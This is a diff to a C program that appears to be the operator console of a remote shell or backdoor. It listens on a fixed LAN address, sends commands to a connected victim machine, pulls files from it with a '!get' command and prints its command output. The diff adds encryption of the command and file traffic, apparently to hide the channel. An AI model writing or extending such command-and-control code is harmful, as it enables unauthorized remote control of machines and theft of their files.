@@ -7,6 +7,8 @@
 #include <string.h>
 #include <netinet/in.h>
 
+#include "crypto.h"
+
 #define STATUS_DONE "[+]Done\n"
 #define STATUS_END "[+]End\n"
 #define STATUS_ERR "[+]Err\n"
@@ -19,7 +21,7 @@ int main(void)
 	char res[1024];
 	struct sockaddr_in serveraddr, clientaddr;
 	serveraddr.sin_family = AF_INET;
-	serveraddr.sin_addr.s_addr = inet_addr("192.168.1.182");
+	serveraddr.sin_addr.s_addr = inet_addr("192.168.1.220");
 	serveraddr.sin_port = htons(11521);
 
 	//listen
@@ -50,7 +52,9 @@ int main(void)
 			system(lcmd);
 			continue;
 		}
+		encrypt(cmd);
 		send(client, cmd, sizeof(cmd), 0);
+		decrypt(cmd);
 		if (!strncmp(cmd, "!exit", 5))
 			break;
 		else if (!strncmp(cmd, "!get ", 5))
@@ -59,6 +63,7 @@ int main(void)
 			char * filename = &cmd[5];
 			FILE * fp = fopen(filename, "wb");
 			recv(client, res, sizeof(res), MSG_WAITALL);
+			decrypt(res);
 			if (strstr(res, STATUS_ERR) != NULL)
 			{
 				printf("[-]Error reading %s\n", filename);
@@ -73,12 +78,14 @@ int main(void)
 				fwrite(res, sizeof(char), sizeof(res), fp);
 				bzero(res, sizeof(res));
 				recv(client, res, sizeof(res), MSG_WAITALL);
+				decrypt(res);
 			}
 			unsigned long nwrite;
 			recv(client, &nwrite, 8, MSG_WAITALL);
 			nwrite = ntohl(nwrite);
 			bzero(res, sizeof(res));
-			recv(client, res, nwrite, MSG_WAITALL);
+			recv(client, res, sizeof(res), MSG_WAITALL);
+			decrypt(res);
 			fwrite(res, sizeof(char), nwrite, fp);
 			bzero(res, sizeof(res));
 			fclose(fp);
@@ -90,6 +97,7 @@ int main(void)
 			{
 				bzero(res, sizeof(res));
 				recv(client, res, sizeof(res), MSG_WAITALL);
+				decrypt(res);
 				printf("%s", res);
 			} while (strstr(res, STATUS_DONE) == NULL);
 		}
